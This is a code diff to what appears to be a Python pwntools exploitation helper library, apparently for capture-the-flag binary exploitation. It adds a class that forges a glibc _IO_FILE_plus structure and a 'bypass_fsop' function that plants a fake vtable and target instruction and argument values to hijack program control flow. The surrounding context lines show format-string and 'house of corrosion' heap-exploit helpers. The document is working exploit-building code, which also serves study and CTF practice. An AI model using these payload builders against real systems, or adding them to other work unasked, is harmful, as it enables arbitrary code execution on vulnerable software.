@@ -1,5 +1,57 @@
 import sys
 import os
+from pwn import *
+
+class FilePlusStruct:
+	def __init__(self):
+		self._flags = 0
+		self._IO_read_ptr = 0
+		self._IO_read_end = 0
+		self._IO_read_base = 0
+		self._IO_write_base = 0
+		self._IO_write_ptr = 0
+		self._IO_write_end = 0
+		self._IO_buf_base = 0
+		self._IO_buf_end = 0
+		self._chain = 0
+		self._fileno = 0
+		self._lock = 0
+		self._vtable = 0
+	
+	def get_payload(self):
+		s = ""
+		s += p64(self._flags)
+		s += p64(self._IO_read_ptr)
+		s += p64(self._IO_read_end)
+		s += p64(self._IO_read_base)
+		s += p64(self._IO_write_base)
+		s += p64(self._IO_write_ptr)
+		s += p64(self._IO_write_end)
+		s += p64(self._IO_buf_base)
+		s += p64(self._IO_buf_end)
+		s += p64(0)*4
+		s += p64(self._chain)
+		s += p64(self._fileno)
+		s += p64(0)*2
+		s += p64(self._lock)
+		s += p64(0xffffffffffffffff)
+		s += p64(0)*5
+		s += p64(0xffffffff)
+		s += p64(0)*2
+		s += p64(self._vtable)
+		return s
+	
+	def bypass_fsop(self, rip, rdi, lock, vtable):
+		self._IO_write_ptr = (rdi-100)/2
+		self._IO_buf_end = (rdi-100)/2
+		self._lock = lock
+		self._vtable = vtable
+		return self.get_payload() + p64(rip)
+
+
+def bypass_fsop(rip, rdi, lock, vtable):
+	fileplus = FilePlusStruct()
+	return fileplus.bypass_fsop(rip, rdi, lock, vtable)
 
 def fsb(width, offset, data, padding, roop):
 	payload = ""
@@ -59,3 +111,4 @@ def o2d(s):
 # for house of corrosion
 def offset2size(off):
 	return ((off)*2-0x10)
+
